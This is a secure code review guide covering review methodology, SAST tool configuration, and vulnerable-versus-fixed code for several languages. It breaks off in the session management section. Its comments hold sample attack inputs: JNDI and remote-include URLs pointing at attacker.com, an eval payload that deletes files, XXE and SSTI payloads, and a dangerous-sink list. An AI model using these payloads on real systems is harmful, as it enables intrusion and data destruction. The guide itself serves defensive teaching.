# Secure Code Review — Manual and Automated Analysis

## Table of Contents

1. [Code Review Methodology](#1-code-review-methodology)
2. [Static Analysis Tools (SAST)](#2-static-analysis-tools-sast)
3. [Language-Specific Vulnerability Patterns](#3-language-specific-vulnerability-patterns)
4. [Authentication and Session Review](#4-authentication-and-session-review)
5. [Input Validation and Output Encoding](#5-input-validation-and-output-encoding)
6. [Cryptographic Implementation Review](#6-cryptographic-implementation-review)
7. [Access Control and Authorization Review](#7-access-control-and-authorization-review)
8. [Data Flow and Architecture Review](#8-data-flow-and-architecture-review)
9. [CI/CD Integration](#9-cicd-integration)
10. [Lab Exercises](#10-lab-exercises)

---

## 1. Code Review Methodology

### 1.1 OWASP Code Review Guide Framework

The OWASP Code Review Guide (v2.0) establishes a systematic methodology for identifying security defects through source code analysis. Unlike black-box penetration testing that probes running applications, code review operates at the source level — providing complete visibility into logic, configuration, and data flow.

The OWASP framework structures code review into three tiers:

| Tier | Approach | Effort | Coverage |
|------|----------|--------|----------|
| Tier 1 | Automated SAST scan + triage | Low | Broad but shallow |
| Tier 2 | Targeted manual review of critical components | Medium | Deep on high-risk paths |
| Tier 3 | Full line-by-line audit with threat model | High | Comprehensive |

Most organizations operate at Tier 2 for routine development, escalating to Tier 3 for components handling authentication, payment processing, or cryptographic operations.

**Core principles from the OWASP guide:**

- **Context is king.** A `system()` call in a build script has different risk than in a web request handler. Always assess reachability from untrusted input.
- **Follow the data.** Trace user-controlled input from entry point to every sink it reaches. Every transformation, storage, and retrieval must be examined.
- **Review against the threat model.** Don't search for generic vulnerabilities — search for the specific threats your threat model identified.
- **Assume compromise.** Review defensively — what happens when a dependency is backdoored, a config file is leaked, or an internal API is hit directly?

### 1.2 Top-Down vs Bottom-Up Review Approaches

**Top-Down (Architecture First):**

Start from the application's entry points and trace execution flow inward:

```
HTTP Request → Router → Middleware → Controller → Service → Repository → DB
                ↓            ↓            ↓           ↓
           Auth check   Rate limit   Validation   Query build
```

1. Map all entry points (routes, event handlers, message consumers, cron jobs)
2. Identify trust boundaries (where data crosses from untrusted to trusted context)
3. Follow critical paths through the call graph
4. Examine how data is sanitized, transformed, and persisted

Top-down works best for unfamiliar codebases, new application audits, and when the threat model drives the review.

**Bottom-Up (Sink First):**

Start from known dangerous functions and trace backward to determine reachability:

```python
# Identify sinks first
dangerous_sinks = [
    "subprocess.call", "os.system", "eval", "exec",
    "cursor.execute",  # without parameterization
    "render_template_string",  # SSTI
    "pickle.loads", "yaml.load",  # deserialization
]
# Then trace: Can untrusted input reach this sink?
```

1. Enumerate all dangerous function calls (SQL, OS commands, deserialization, template rendering)
2. For each sink, trace backward through the call graph
3. Identify whether any path from an untrusted source reaches the sink without sanitization
4. Document sanitization gaps

Bottom-up is efficient when reviewing specific vulnerability classes or performing targeted sweeps.

**Hybrid Approach (Recommended):**

Combine both: use top-down to understand architecture, then bottom-up to validate specific vulnerability classes. The top-down pass identifies the critical paths; the bottom-up pass ensures no dangerous pattern was missed.

### 1.3 Threat-Model-Driven Review

A threat model (STRIDE, PASTA, or attack trees) produces a prioritized list of threats. Use this directly to scope the code review:

| Threat | Review Focus | Code Artifacts |
|--------|-------------|----------------|
| Spoofing | Authentication bypass | Login handlers, token validation, session creation |
| Tampering | Input validation gaps | Request parsers, form handlers, API endpoints |
| Repudiation | Audit logging completeness | Logger calls, event emission, audit trail |
| Information Disclosure | Data leakage | Error handlers, serialization, logging |
| Denial of Service | Resource exhaustion | Loops, recursion, allocation without bounds |
| Elevation of Privilege | Authorization checks | Middleware, decorators, RBAC enforcement |

For each identified threat, formulate specific review questions:

```
Threat: "Attacker forges JWT to impersonate admin"
Review questions:
  - Where is the JWT signature verified?
  - Is the algorithm enforced server-side (not from the token header)?
  - Are all claims validated (exp, iss, aud)?
  - Can an expired token be used in any code path?
  - Is the signing key stored securely and rotated?
```

### 1.4 Time-Boxed Review Strategies for Large Codebases

When full review is infeasible (100K+ LOC), use time-boxed strategies:

**1. Risk-Ranked File Prioritization:**

Score each file/module based on:
- Exposure to untrusted input (×3 weight)
- Complexity (cyclomatic complexity > 20)
- Recent change frequency (git churn)
- Handles sensitive data (auth, PII, crypto)
- Historical vulnerability density

```bash
# Identify high-churn security-sensitive files
git log --since="6 months ago" --name-only --pretty=format: \
  | sort | uniq -c | sort -rn \
  | grep -E "(auth|login|session|crypto|token|payment)" \
  | head -20
```

**2. Change-Based Review (Delta Review):**

Focus exclusively on modified code since last review baseline:

```bash
# Files changed since last security review tag
git diff --name-only security-review-v2.1..HEAD \
  | grep -E '\.(java|py|js|ts|go|rb)$'
```

**3. Time Budget Allocation:**

For a 40-hour review engagement:
- Architecture understanding: 4 hours (10%)
- Authentication/session: 10 hours (25%)
- Input validation/injection: 8 hours (20%)
- Access control: 6 hours (15%)
- Cryptography: 4 hours (10%)
- Data flow/information disclosure: 4 hours (10%)
- Configuration/deployment: 2 hours (5%)
- Third-party dependencies: 2 hours (5%)

### 1.5 Review Prioritization Hierarchy

Not all code carries equal risk. Prioritize review effort:

```
Priority 1 (Critical): Authentication, session management, cryptographic operations
Priority 2 (High):     Input handling, injection sinks, output encoding
Priority 3 (High):     Access control, authorization enforcement
Priority 4 (Medium):   Data storage, encryption at rest, secrets handling
Priority 5 (Medium):   Error handling, logging, information disclosure
Priority 6 (Lower):    Business logic, denial of service, resource management
```

This hierarchy reflects that authentication bypass provides complete system compromise, while a logging information leak requires additional exploitation steps.

### 1.6 Checklist-Based vs Exploratory Review

**Checklist-Based Review:**

Systematic verification against predefined criteria. Ensures consistency and completeness.

```markdown
## Authentication Checklist
- [ ] Password hashing uses memory-hard KDF (argon2id, bcrypt, scrypt)
- [ ] Timing-safe comparison for credential verification
- [ ] Account lockout or progressive delays after failed attempts
- [ ] Session token entropy >= 128 bits
- [ ] Session invalidated on password change
- [ ] CSRF tokens on all state-changing operations
- [ ] Multi-factor enforcement cannot be bypassed via API

## Injection Prevention Checklist
- [ ] All SQL queries use parameterized statements
- [ ] No string concatenation in query construction
- [ ] ORM queries don't accept raw user input in filter expressions
- [ ] Template rendering never uses user-controlled template strings
- [ ] OS command execution uses allowlist, not blocklist
- [ ] XML parsing disables external entities (XXE)
- [ ] Deserialization restricted to known-safe types
```

**Exploratory Review:**

Creative, attacker-mindset-driven exploration without rigid structure. The reviewer asks "what if?" questions:

- What if I send a negative quantity to the payment handler?
- What happens if the race condition between authorization check and action execution is exploited?
- Can I manipulate the order of operations to skip validation?
- What if the upstream service returns malformed data?

**Combined Strategy:**

Use checklists for systematic coverage (prevents gaps), supplemented by exploratory review for business logic and novel attack patterns. The checklist catches the known vulnerability classes; exploration catches the application-specific logic flaws.

---

## 2. Static Analysis Tools (SAST)

### 2.1 Semgrep: Custom Rules, Pattern Syntax, and CI Integration

Semgrep is an open-source, multi-language static analysis engine that matches code patterns using a lightweight, syntax-aware pattern language.

**Pattern Syntax Fundamentals:**

```yaml
# .semgrep/rules/sql-injection.yaml
rules:
  - id: raw-sql-string-format
    patterns:
      - pattern: |
          cursor.execute($QUERY % ...)
      - pattern-not: |
          cursor.execute($QUERY, ...)
    message: >
      SQL query uses string formatting instead of parameterized query.
      Use cursor.execute(query, params) instead.
    severity: ERROR
    languages: [python]
    metadata:
      cwe: CWE-89
      owasp: A03:2021
      confidence: HIGH
```

**Key pattern operators:**

| Operator | Purpose | Example |
|----------|---------|---------|
| `$VAR` | Matches any expression | `eval($USER_INPUT)` |
| `...` | Matches zero or more arguments/statements | `func(..., dangerous=True, ...)` |
| `pattern-not` | Exclude safe patterns | Exclude parameterized queries |
| `pattern-inside` | Require enclosing context | Only match inside request handlers |
| `pattern-not-inside` | Exclude safe context | Exclude test files |
| `metavariable-regex` | Constrain variable content | Match only HTTP methods |
| `metavariable-comparison` | Numeric comparison on metavar | Timeout values < 30 |

**Taint tracking (Pro/Dataflow):**

```yaml
rules:
  - id: tainted-sql-injection
    mode: taint
    pattern-sources:
      - patterns:
          - pattern: flask.request.$METHOD.get(...)
      - patterns:
          - pattern: request.args[...]
    pattern-sinks:
      - patterns:
          - pattern: cursor.execute($QUERY, ...)
          - focus-metavariable: $QUERY
    pattern-sanitizers:
      - patterns:
          - pattern: bleach.clean(...)
    message: User input flows to SQL query without sanitization.
    severity: ERROR
    languages: [python]
```

**Autofix capability:**

```yaml
rules:
  - id: dangerous-yaml-load
    pattern: yaml.load($DATA)
    fix: yaml.safe_load($DATA)
    message: yaml.load() allows arbitrary code execution. Use safe_load().
    severity: ERROR
    languages: [python]
```

**CI Integration (GitHub Actions):**

```yaml
# .github/workflows/semgrep.yml
name: Semgrep Security Scan
on:
  pull_request:
    branches: [main, develop]
  push:
    branches: [main]

jobs:
  semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep:latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          semgrep scan \
            --config=p/default \
            --config=p/owasp-top-ten \
            --config=.semgrep/ \
            --sarif --output=semgrep-results.sarif \
            --error \
            --exclude='**/test/**' \
            --exclude='**/vendor/**'
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep-results.sarif
        if: always()
```

### 2.2 CodeQL: QL Language, Data Flow, and Taint Tracking

CodeQL (GitHub) compiles source code into a relational database, then runs queries in the Datalog-inspired QL language. It excels at interprocedural taint tracking.

**QL Language Basics:**

```ql
// Find all calls to Runtime.exec with string concatenation
import java
import semmle.code.java.dataflow.TaintTracking

class CommandInjectionConfig extends TaintTracking::Configuration {
  CommandInjectionConfig() { this = "CommandInjectionConfig" }

  override predicate isSource(DataFlow::Node source) {
    exists(Parameter p |
      p.getType().hasName("HttpServletRequest") and
      source.asParameter() = p
    )
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(MethodAccess ma |
      ma.getMethod().hasName("exec") and
      ma.getMethod().getDeclaringType().hasQualifiedName("java.lang", "Runtime") and
      sink.asExpr() = ma.getArgument(0)
    )
  }
}

from CommandInjectionConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink,
  "Command injection: user input from $@ flows to Runtime.exec()",
  source.getNode(), "HTTP request parameter"
```

**Custom Query Structure:**

```ql
/**
 * @name Hardcoded credentials in source
 * @description Finds string literals that appear to be passwords or API keys
 * @kind problem
 * @problem.severity error
 * @security-severity 9.0
 * @precision high
 * @id java/hardcoded-credential
 * @tags security
 *       external/cwe/cwe-798
 */
import java

from StringLiteral s, Variable v
where
  v.getAnAssignedValue() = s and
  v.getName().regexpMatch("(?i).*(password|secret|api_key|token|credential).*") and
  s.getValue().length() > 8 and
  not s.getValue().regexpMatch("\\$\\{.*\\}|%s|\\*+|x+|placeholder|changeme|todo")
select s, "Potential hardcoded credential assigned to variable '" + v.getName() + "'"
```

**Database creation and analysis:**

```bash
# Create CodeQL database from source
codeql database create ./codeql-db \
  --language=java \
  --source-root=./src \
  --command="mvn clean compile -DskipTests"

# Run security queries
codeql database analyze ./codeql-db \
  codeql/java-queries:Security \
  --format=sarif-latest \
  --output=results.sarif \
  --threads=4

# Run custom query pack
codeql database analyze ./codeql-db \
  ./custom-queries/ \
  --format=csv \
  --output=custom-results.csv
```

### 2.3 SonarQube: Quality Gates, Security Hotspots, Custom Rules

SonarQube provides continuous code quality and security inspection with a web dashboard.

**Quality Gate Configuration (Security-Focused):**

```json
{
  "name": "Security Gate",
  "conditions": [
    { "metric": "new_security_hotspots_reviewed", "op": "LT", "error": "100" },
    { "metric": "new_vulnerabilities", "op": "GT", "error": "0" },
    { "metric": "new_security_rating", "op": "GT", "error": "1" },
    { "metric": "new_blocker_violations", "op": "GT", "error": "0" },
    { "metric": "new_critical_violations", "op": "GT", "error": "0" }
  ]
}
```

**Security Hotspot Workflow:**

SonarQube marks code patterns that might be vulnerable as "Security Hotspots" requiring human review:

1. Developer writes code with potential security implications
2. SonarQube flags it as a hotspot (not a confirmed vulnerability)
3. Security reviewer examines context and marks: Safe / Fixed / To Fix
4. Unreviewed hotspots block the quality gate

**Custom Rule (Java plugin):**

```java
@Rule(key = "InsecureDeserialization")
public class InsecureDeserializationCheck extends IssuableSubscriptionVisitor {

  @Override
  public List<Tree.Kind> nodesToVisit() {
    return List.of(Tree.Kind.METHOD_INVOCATION);
  }

  @Override
  public void visitNode(Tree tree) {
    MethodInvocationTree mit = (MethodInvocationTree) tree;
    if (isObjectInputStreamReadObject(mit)) {
      Symbol.MethodSymbol method = (Symbol.MethodSymbol) mit.symbol();
      if (!isInsideTryWithLookAheadFilter(mit)) {
        reportIssue(mit, "ObjectInputStream.readObject() without type filtering. " +
          "Use ObjectInputFilter or a validated allowlist.");
      }
    }
  }
}
```

### 2.4 Language-Specific SAST Tools

**Bandit (Python):**

```bash
# Configuration: .bandit.yaml
bandit -r src/ \
  --configfile .bandit.yaml \
  --severity-level medium \
  --confidence-level medium \
  --format json \
  --output bandit-results.json \
  --exclude ./src/tests/

# .bandit.yaml
skips: ['B101']  # Skip assert warnings in non-test code
tests: ['B301', 'B302', 'B303', 'B304', 'B305', 'B306', 'B307',
        'B308', 'B310', 'B311', 'B312', 'B313', 'B314', 'B315',
        'B316', 'B317', 'B318', 'B319', 'B320', 'B321', 'B322',
        'B323', 'B324', 'B325']
```

**Brakeman (Ruby on Rails):**

```bash
brakeman --run-all-checks \
  --format json \
  --output brakeman-results.json \
  --no-pager \
  --confidence-level 1
```

**SpotBugs + FindSecBugs (Java):**

```xml
<!-- pom.xml -->
<plugin>
  <groupId>com.github.spotbugs</groupId>
  <artifactId>spotbugs-maven-plugin</artifactId>
  <version>4.8.3.0</version>
  <configuration>
    <plugins>
      <plugin>
        <groupId>com.h3xstream.findsecbugs</groupId>
        <artifactId>findsecbugs-plugin</artifactId>
        <version>1.13.0</version>
      </plugin>
    </plugins>
    <effort>Max</effort>
    <threshold>Low</threshold>
    <includeFilterFile>spotbugs-security-filter.xml</includeFilterFile>
  </configuration>
</plugin>
```

### 2.5 Commercial Tool Comparison

| Feature | Snyk Code | Checkmarx SAST | Fortify |
|---------|-----------|----------------|---------|
| Languages | 15+ | 30+ | 30+ |
| Speed | Fast (IDE real-time) | Medium | Slow |
| Accuracy | High (ML-based) | High (rules-based) | High |
| Custom Rules | Limited | CxQL language | Custom rule packs |
| CI Integration | Native | API/Plugin | API/Plugin |
| False Positive Rate | Low-Medium | Medium | Medium-High |
| Pricing Model | Per developer | Per scan/LOC | Per application |
| Taint Tracking | Interprocedural | Interprocedural | Interprocedural |
| Fix Suggestions | AI-generated | Pattern-based | Pattern-based |

### 2.6 False Positive Management

False positives erode developer trust. A SAST tool generating 80% false positives will be ignored entirely.

**Strategies:**

1. **Baseline Management:** Establish a baseline of existing findings; only fail on new findings:
```bash
# Create baseline
semgrep scan --config=auto --json > .semgrep-baseline.json

# Scan only new findings
semgrep scan --config=auto --baseline-commit=$(git merge-base HEAD main)
```

2. **Suppression with Documentation:**
```java
// Suppressing a specific finding with justification
@SuppressWarnings("squid:S2068")  // SonarQube: credential is a test constant
private static final String TEST_TOKEN = "test-only-not-a-real-secret";

// Semgrep inline suppression
result = process(data)  # nosemgrep: dangerous-function-call
```

3. **Tuning Rules:**
- Exclude test directories from production-security rules
- Create language-specific exceptions (e.g., `assert` in Python test code)
- Adjust confidence thresholds per rule
- Mark sanctioned patterns as safe (e.g., approved crypto libraries)

4. **Triage SLA:**
- Critical findings: triaged within 1 business day
- High findings: triaged within 3 business days
- Medium/Low: triaged within sprint

---

## 3. Language-Specific Vulnerability Patterns

### 3.1 Java

**Deserialization (CWE-502):**

Vulnerable:
```java
// Deserializes arbitrary objects — classic RCE vector
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(userInput));
Object obj = ois.readObject(); // Gadget chain trigger point
```

Fixed:
```java
// Use ObjectInputFilter (Java 9+) with strict allowlist
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(userInput));
ois.setObjectInputFilter(filterInfo -> {
    Class<?> clazz = filterInfo.serialClass();
    if (clazz == null) return ObjectInputFilter.Status.UNDECIDED;
    if (ALLOWED_CLASSES.contains(clazz.getName())) {
        return ObjectInputFilter.Status.ALLOWED;
    }
    return ObjectInputFilter.Status.REJECTED;
});
Object obj = ois.readObject();
```

**Gadget chains (ysoserial):** The attacker doesn't need your code to be vulnerable — they need your classpath to contain exploitable libraries. Common gadgets: Commons Collections (InvokerTransformer), Spring (MethodInvokeTypeProvider), Groovy (ConvertedClosure). Mitigation: remove unnecessary dependencies, use allowlist-based deserialization, avoid Java serialization entirely (prefer JSON).

**JNDI Injection (Log4Shell pattern):**

Vulnerable:
```java
// User-controlled input in JNDI lookup
String userInput = request.getParameter("resource");
InitialContext ctx = new InitialContext();
ctx.lookup(userInput);  // If input is "ldap://attacker.com/exploit" → RCE
```

Fixed:
```java
// Restrict JNDI protocols and validate input
private static final Set<String> ALLOWED_PREFIXES = Set.of("java:comp/env/");

String resource = request.getParameter("resource");
if (ALLOWED_PREFIXES.stream().noneMatch(resource::startsWith)) {
    throw new SecurityException("Invalid JNDI resource: " + resource);
}
InitialContext ctx = new InitialContext();
ctx.lookup(resource);
```

**XXE (XML External Entities):**

Vulnerable:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userInputStream); // Allows <!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Fixed:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userInputStream);
```

**Spring Expression Language (SpEL) Injection:**

Vulnerable:
```java
@GetMapping("/search")
public String search(@RequestParam String query) {
    ExpressionParser parser = new SpelExpressionParser();
    // User input directly in SpEL expression — allows RCE
    Expression exp = parser.parseExpression(query);
    return exp.getValue().toString();
}
```

### 3.2 Python

**Pickle Deserialization:**

Vulnerable:
```python
import pickle

# Never deserialize untrusted data with pickle
data = request.files['upload'].read()
obj = pickle.loads(data)  # Arbitrary code execution via __reduce__
```

Fixed:
```python
import json
import jsonschema

# Use safe serialization format with schema validation
data = request.files['upload'].read()
obj = json.loads(data)
jsonschema.validate(obj, EXPECTED_SCHEMA)
```

**eval/exec Injection:**

Vulnerable:
```python
# User-controlled expression evaluation
expression = request.args.get('calc')
result = eval(expression)  # eval("__import__('os').system('rm -rf /')") → RCE
```

Fixed:
```python
import ast
import operator

# Safe arithmetic evaluator using AST
SAFE_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
}

def safe_eval(expr: str) -> float:
    tree = ast.parse(expr, mode='eval')
    return _eval_node(tree.body)

def _eval_node(node):
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return node.value
    if isinstance(node, ast.BinOp):
        op_func = SAFE_OPS.get(type(node.op))
        if op_func is None:
            raise ValueError(f"Unsupported operator: {type(node.op).__name__}")
        return op_func(_eval_node(node.left), _eval_node(node.right))
    raise ValueError(f"Unsupported expression: {ast.dump(node)}")
```

**Server-Side Template Injection (SSTI):**

Vulnerable:
```python
from flask import Flask, request, render_template_string

@app.route('/greeting')
def greeting():
    name = request.args.get('name', 'World')
    # User input rendered as template — SSTI
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)
    # Input: {{config}} leaks config
    # Input: {{''.__class__.__mro__[1].__subclasses__()}} → RCE chain
```

Fixed:
```python
from flask import Flask, request, render_template_string
from markupsafe import escape

@app.route('/greeting')
def greeting():
    name = request.args.get('name', 'World')
    # Pass user input as a template variable, never as template source
    return render_template_string("<h1>Hello {{ name }}!</h1>", name=name)
```

**subprocess Injection:**

Vulnerable:
```python
import subprocess

filename = request.args.get('file')
# shell=True with user input — command injection
subprocess.call(f"cat {filename}", shell=True)
```

Fixed:
```python
import subprocess
import os.path

filename = request.args.get('file')
# Validate and use list form (no shell interpretation)
safe_name = os.path.basename(filename)  # Strip path traversal
allowed_dir = '/var/app/uploads'
full_path = os.path.join(allowed_dir, safe_name)

if not os.path.realpath(full_path).startswith(os.path.realpath(allowed_dir)):
    raise ValueError("Path traversal detected")

subprocess.run(["cat", full_path], shell=False, check=True, capture_output=True)
```

### 3.3 JavaScript / Node.js

**Prototype Pollution:**

Vulnerable:
```javascript
// Deep merge without prototype check
function deepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key]; // Pollutes Object.prototype if key is "__proto__"
    }
  }
  return target;
}

// Attack payload: {"__proto__": {"isAdmin": true}}
// After pollution: ({}).isAdmin === true for ALL objects
```

Fixed:
```javascript
function deepMerge(target, source) {
  for (const key of Object.keys(source)) { // Use Object.keys, not for...in
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue; // Block prototype-polluting keys
    }
    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      if (!Object.hasOwn(target, key)) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
// Better: use Object.create(null) for config objects, or use Map
```

**Regular Expression Denial of Service (ReDoS):**

Vulnerable:
```javascript
// Catastrophic backtracking: O(2^n) on crafted input
const emailRegex = /^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\.[a-zA-Z]+$/;
const isValid = emailRegex.test(userInput);
// Input: "aaaaaaaaaaaaaaaaaaaaa!" causes exponential backtracking
```

Fixed:
```javascript
// Use atomic grouping patterns or linear-time regex engines
// Option 1: Rewrite to avoid nested quantifiers
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

// Option 2: Use RE2 (linear-time guarantee)
const RE2 = require('re2');
const safeRegex = new RE2('^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$');
```

**Path Traversal:**

Vulnerable:
```javascript
const path = require('path');
const fs = require('fs');

app.get('/files/:name', (req, res) => {
  const filePath = path.join('/uploads', req.params.name);
  // ../../../etc/passwd passes through path.join
  res.sendFile(filePath);
});
```

Fixed:
```javascript
const path = require('path');
const fs = require('fs');

const UPLOAD_DIR = path.resolve('/uploads');

app.get('/files/:name', (req, res) => {
  const filePath = path.resolve(UPLOAD_DIR, req.params.name);
  // Verify resolved path stays within allowed directory
  if (!filePath.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  res.sendFile(filePath);
});
```

### 3.4 Go

**Goroutine Leaks:**

Vulnerable:
```go
func fetchWithTimeout(url string) ([]byte, error) {
    ch := make(chan []byte)
    go func() {
        resp, err := http.Get(url)
        if err != nil {
            return // Goroutine leaks: channel is never closed, no receiver
        }
        defer resp.Body.Close()
        body, _ := io.ReadAll(resp.Body)
        ch <- body // Blocks forever if parent times out and stops reading
    }()

    select {
    case data := <-ch:
        return data, nil
    case <-time.After(5 * time.Second):
        return nil, fmt.Errorf("timeout") // Goroutine leaked
    }
}
```

Fixed:
```go
func fetchWithTimeout(ctx context.Context, url string) ([]byte, error) {
    ctx, cancel := context.WithTimeout(ctx, 5*time.Second)
    defer cancel()

    req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
    if err != nil {
        return nil, err
    }

    resp, err := http.DefaultClient.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    // io.ReadAll respects context cancellation via the request
    return io.ReadAll(resp.Body)
}
```

**Race Conditions:**

Vulnerable:
```go
var balance int64 // Shared state without synchronization

func withdraw(amount int64) error {
    if balance >= amount { // TOCTOU: check and update are not atomic
        balance -= amount
        return nil
    }
    return fmt.Errorf("insufficient funds")
}
```

Fixed:
```go
var (
    balance int64
    mu      sync.Mutex
)

func withdraw(amount int64) error {
    mu.Lock()
    defer mu.Unlock()
    if balance >= amount {
        balance -= amount
        return nil
    }
    return fmt.Errorf("insufficient funds")
}

// Or use atomic operations for simple counters:
// atomic.AddInt64(&balance, -amount)
```

**Template Injection:**

Vulnerable:
```go
func handler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    // User input as template source — template injection
    tmpl, _ := template.New("t").Parse("Hello " + name)
    tmpl.Execute(w, nil)
}
```

Fixed:
```go
func handler(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    // Pre-compiled template with user input as data
    tmpl := template.Must(template.New("t").Parse("Hello {{.Name}}"))
    tmpl.Execute(w, map[string]string{"Name": name})
}
```

### 3.5 C/C++

**Buffer Overflow:**

Vulnerable:
```c
void process_input(const char *input) {
    char buffer[64];
    strcpy(buffer, input); // No bounds checking — stack overflow if input > 63 bytes
    printf("Received: %s\n", buffer);
}
```

Fixed:
```c
void process_input(const char *input) {
    char buffer[64];
    size_t input_len = strlen(input);
    if (input_len >= sizeof(buffer)) {
        fprintf(stderr, "Input too long: %zu bytes\n", input_len);
        return;
    }
    memcpy(buffer, input, input_len + 1); // Include null terminator
    printf("Received: %s\n", buffer);
}
// Or simply: snprintf(buffer, sizeof(buffer), "%s", input);
```

**Format String Vulnerability:**

Vulnerable:
```c
void log_message(const char *user_msg) {
    printf(user_msg); // User-controlled format string → info leak or write
    // Input: "%x%x%x%x" leaks stack contents
    // Input: "%n" writes to arbitrary memory
}
```

Fixed:
```c
void log_message(const char *user_msg) {
    printf("%s", user_msg); // Format specifier prevents interpretation
}
```

**Use-After-Free:**

Vulnerable:
```c
struct Session *session = malloc(sizeof(struct Session));
init_session(session);
// ... later in error path ...
free(session);
// ... even later, forgotten the free ...
session->user_id = new_user_id; // UAF: writes to freed memory
```

Fixed:
```c
free(session);
session = NULL; // Null after free — subsequent access will segfault (detectable)

// Better: use RAII in C++ (unique_ptr) or arena allocators in C
```

**Integer Overflow:**

Vulnerable:
```c
void allocate_buffer(uint32_t num_elements, uint32_t element_size) {
    // Integer overflow: 0x10000 * 0x10000 = 0 (wraps around)
    uint32_t total_size = num_elements * element_size;
    char *buf = malloc(total_size); // Allocates 0 bytes or tiny buffer
    // Subsequent writes overflow the undersized allocation
}
```

Fixed:
```c
#include <stdckdint.h> // C23, or use compiler builtins

void allocate_buffer(uint32_t num_elements, uint32_t element_size) {
    size_t total_size;
    if (__builtin_mul_overflow(num_elements, element_size, &total_size)) {
        return; // Overflow detected
    }
    if (total_size == 0 || total_size > MAX_ALLOCATION) {
        return; // Sanity bounds
    }
    char *buf = malloc(total_size);
    if (!buf) return;
    // Safe to use
}
```

### 3.6 PHP

**Type Juggling:**

Vulnerable:
```php
// Loose comparison with == allows type coercion attacks
$password_hash = "0e462097431906509019562988736854"; // MD5 starting with 0e
$user_input = "0e999999999999999"; // Also interpreted as 0 (scientific notation)

if ($password_hash == $user_input) { // TRUE! Both evaluate to 0
    grant_access();
}
```

Fixed:
```php
// Always use strict comparison (===) or hash_equals for timing safety
if (hash_equals($stored_hash, $computed_hash)) {
    grant_access();
}
// Or: use password_verify() which handles comparison internally
if (password_verify($password, $stored_hash)) {
    grant_access();
}
```

**Unsafe unserialize:**

Vulnerable:
```php
// unserialize with user input — object injection leading to RCE
$data = $_COOKIE['session_data'];
$obj = unserialize($data); // Triggers __wakeup(), __destruct() on crafted objects
```

Fixed:
```php
// Option 1: Use JSON instead
$data = $_COOKIE['session_data'];
$obj = json_decode($data, true); // Cannot instantiate objects

// Option 2: If serialization required, restrict allowed classes
$obj = unserialize($data, ['allowed_classes' => [SafeDTO::class]]);
```

**Include/Require Injection (LFI/RFI):**

Vulnerable:
```php
// User-controlled file inclusion
$page = $_GET['page'];
include("pages/" . $page . ".php");
// Input: ../../etc/passwd%00 (null byte for older PHP)
// Input: http://attacker.com/shell (if allow_url_include=On)
```

Fixed:
```php
$allowed_pages = ['home', 'about', 'contact', 'products'];
$page = $_GET['page'] ?? 'home';

if (!in_array($page, $allowed_pages, true)) { // strict comparison
    http_response_code(404);
    exit('Page not found');
}
include("pages/{$page}.php");
```

---

## 4. Authentication and Session Review

### 4.1 Password Hashing Review

**What to verify:**

| Parameter | Minimum Requirement | Ideal |
|-----------|-------------------|-------|
| Algorithm | bcrypt, scrypt, or argon2id | argon2id |
| bcrypt cost | 10 | 12-14 |
| argon2id memory | 19 MiB | 64 MiB |
| argon2id iterations | 2 | 3 |
| argon2id parallelism | 1 | 4 |
| Salt | Unique per password, ≥16 bytes | 32 bytes |

**Code review red flags:**

```python
# RED FLAG: MD5/SHA for passwords (no salt, no work factor)
password_hash = hashlib.md5(password.encode()).hexdigest()

# RED FLAG: Single iteration SHA
password_hash = hashlib.sha256(password.encode()).hexdigest()

# RED FLAG: Hardcoded salt (same salt for all users)
password_hash = bcrypt.hashpw(password, b'$2b$12$StaticSaltHere!')

# RED FLAG: Insufficient work factor
password_hash = bcrypt.hashpw(password, bcrypt.gensalt(rounds=4))
```

**Timing attack in credential verification:**

Vulnerable:
```python
def verify_login(username, password):
    user = db.get_user(username)
    if user is None:
        return False  # Returns faster for non-existent users (timing oracle)
    return user.password_hash == compute_hash(password)  # Non-constant-time compare
```

Fixed:
```python
import hmac

# Dummy hash for non-existent users (prevents user enumeration via timing)
DUMMY_HASH = argon2.hash("dummy_password_for_timing")

def verify_login(username, password):
    user = db.get_user(username)
    stored_hash = user.password_hash if user else DUMMY_HASH
    # argon2.verify uses constant-time comparison internally
    is_valid = argon2.verify(stored_hash, password)
    return is_valid and user is not None
```

### 4.2 Session Management Flaws

**Review checklist:**

